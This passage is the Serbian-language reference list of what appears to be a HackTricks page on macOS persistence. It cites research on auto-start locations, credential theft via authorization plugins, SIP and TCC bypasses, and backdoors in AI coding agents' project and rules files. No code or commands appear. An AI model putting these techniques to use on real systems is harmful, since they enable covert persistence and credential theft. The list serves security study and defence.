- [16] [Pored dobrih starih LaunchAgents-a - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Pored dobrih starih LaunchAgents-a - 24 - radnje nad fasciklama](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Radnje nad fasciklama za postojanost na macOS-u (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Pored dobrih starih LaunchAgents-a - 27 - Dock prečice](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Pored dobrih starih LaunchAgents-a - 17 - birači boja](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Pored dobrih starih LaunchAgents-a - 26 - Finder Sync dodaci](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza postojanosti „Mac File Opener“-a (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Pored dobrih starih LaunchAgents-a - 16 - čuvar ekrana](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Sačuvajte pristup: čuvari ekrana za postojanost na macOS-u (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Pored dobrih starih LaunchAgents-a - 11 - uvoznici Spotlight-a](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Pored dobrih starih LaunchAgents-a - 9 - okno podešavanja](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Pored dobrih starih LaunchAgents-a - 19 - periodične skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Pored dobrih starih LaunchAgents-a - 5 - priključivi moduli za autentifikaciju (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Pored dobrih starih LaunchAgents-a - 28 - dodaci za autorizaciju](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Krađa akreditiva uz pomoć dodataka za autorizaciju (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Pored dobrih starih LaunchAgents-a - 30 - konfiguraciona datoteka man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Pored dobrih starih LaunchAgents-a - 25 - Apache2 moduli](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Pored dobrih starih LaunchAgents-a - 31 - BSM okvir za reviziju](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Pored dobrih starih LaunchAgents-a - 23 - emond, demon za nadzor događaja](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Pored dobrih starih LaunchAgents-a - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Pored dobrih starih LaunchAgents-a - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Pored dobrih starih LaunchAgents-a - 10 - datoteke skripti aplikacija](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Pored dobrih starih LaunchAgents-a - 32 - Dock Tile dodaci](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Pored dobrih starih LaunchAgents-a - 33 - vidžeti](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Pored dobrih starih LaunchAgents-a - 34 - launchd zadaci pri pokretanju](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Pored dobrih starih LaunchAgents-a - 35 - postojanost kroz NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Korišćenje e-pošte za postojanost na OS X-u (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Sumnjiva izmena plist pravila za Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Zlonamerni profili - jedna od najozbiljnijih pretnji za Mac računare (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Umetnost Mac malware-a, tom 1 - pogl. 0x2, postojanost (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analiza CVE-2024-44243, zaobilaženja SIP-a na macOS-u preko ekstenzija kernela (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE i eksfiltracija API tokena preko projektnih datoteka Claude Code-a (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nova ranjivost u GitHub Copilot-u i Cursor-u - backdoor u datoteci sa pravilima (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - alternativni načini instalacije (spoljašnja proširenja)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Uklanjanje ExtensionInstallForcelist-a u Chrome-u na Mac-u (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Pisanje Sudo dodataka (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Daljinska eksploatacija Mac-a preko prilagođenih URL šema (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dva trika za postojanost na macOS-u uz zloupotrebu dodataka (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimalni primer CoreMediaIO DAL-a (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analiza ranjivosti macOS TCC-a zasnovane na Spotlight-u (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentacija Python modula `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Od Spotlight-a do Apple Intelligence-a — zloupotreba 0day ranjivosti za krađu podataka koji pokreću macOS AI](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
